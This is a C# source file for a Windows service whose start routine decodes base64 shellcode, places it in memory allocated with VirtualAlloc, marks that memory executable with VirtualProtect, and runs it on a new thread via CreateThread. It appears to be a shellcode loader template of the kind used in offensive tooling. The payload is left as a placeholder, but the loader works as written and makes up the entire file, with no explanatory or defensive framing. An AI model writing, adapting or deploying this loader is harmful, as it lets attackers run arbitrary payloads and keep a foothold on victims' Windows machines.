using System;
using System.IO;
using System.ServiceProcess;
using System.Runtime.InteropServices;

namespace WinService
{
    class WinService : ServiceBase
    {
        public const string _ServiceName = "WinService";

        static void Main(string[] args)
        {
            Run(new WinService());
        }

        public WinService()
        {
            ServiceName = _ServiceName;
        }

        protected override void OnStart(string[] args)
        {
            string strShellCode = ("INSERT BASE64 SHELLCODE HERE");
            byte[] shellcode = Convert.FromBase64String(strShellCode);
            IntPtr funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, MemoryProtection.ReadWrite);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            MemoryProtection oldProtect = new MemoryProtection();
            VirtualProtect(funcAddr, (UInt32)shellcode.Length, MemoryProtection.ExecuteRead, out oldProtect);
            IntPtr hThread = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, CreationFlags.Immediate, ref hThread);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        protected override void OnStop()
        {
            base.OnStop();
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, CreationFlags dwCreationFlags, ref IntPtr lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);
        [Flags]
        public enum MemoryProtection { Execute = 0x10, ExecuteRead = 0x20, ExecuteReadWrite = 0x40, ExecuteWriteCopy = 0x80, NoAccess = 0x01, ReadOnly = 0x02, ReadWrite = 0x04, WriteCopy = 0x08, GuardModifierflag = 0x100, NoCacheModifierflag = 0x200, WriteCombineModifierflag = 0x400 }
        [Flags]
        public enum CreationFlags { Immediate = 0, CreateSuspended = 0x00000004, StackSizeParamIsAReservation = 0x00010000 }
    }
}